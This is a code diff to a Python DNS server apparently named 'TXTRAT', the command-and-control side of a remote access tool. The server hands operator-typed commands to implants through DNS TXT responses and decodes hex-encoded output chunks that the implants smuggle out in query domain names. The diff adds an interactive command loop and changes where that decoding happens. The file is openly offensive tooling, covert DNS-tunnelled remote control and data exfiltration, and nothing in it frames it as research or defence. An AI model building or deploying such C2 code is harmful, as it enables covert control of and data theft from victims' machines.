@@ -78,7 +78,7 @@ def getquestiondomain(data):
 
 def printreturn():
     global out
-    print(bytes.fromhex(out).decode('utf-8').replace(";","\n").rstrip(",;0"))
+    print(out.replace(";", "\n").rstrip(",;0"))
     out = ''
 
 def formatout(domain):
@@ -94,7 +94,7 @@ def pullchunksfirst(domain):
 
     c2id = '31337'							# set this later when working with multiple connections
     chunk = domain[0]
-    out += chunk
+    out += bytes.fromhex(chunk).decode('utf-8')
 
     dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': c2id}]}
 
@@ -105,7 +105,7 @@ def pullchunks(domain):
 
     c2id = domain[0]
     chunk = domain[1]
-    out += chunk
+    out += bytes.fromhex(chunk).decode('utf-8')
 
     dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': chunk}]}
 
@@ -203,7 +203,6 @@ def buildresponse(data, command):
     QDCOUNT = b'\x00\x01'
 
     # Answer Count
-    #ANCOUNT = len(getrecs(data[12:])[0]).to_bytes(2, byteorder='big')
     ANCOUNT = (1).to_bytes(2, byteorder='big')
 
     # Nameserver Count
@@ -236,6 +235,7 @@ def buildresponse(data, command):
 
 
 def main():
+    global out
 
     usage = "TXTRAT"
     parser = OptionParser()
@@ -259,12 +259,20 @@ def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((ip, port))
 
-    command = input("input: ")
+    while 1:
+        command = input("input: ")
+        out += command + "\n"
+        while len(out) != 0:
+            data, addr = sock.recvfrom(512)
+            r = buildresponse(data, command)
+            sock.sendto(r, addr)
 
+
+    """command = input("input: ")
     while 1:
         data, addr = sock.recvfrom(512)
         r = buildresponse(data, command)
         sock.sendto(r, addr)
-        #print(out)
+    """
 
 main()
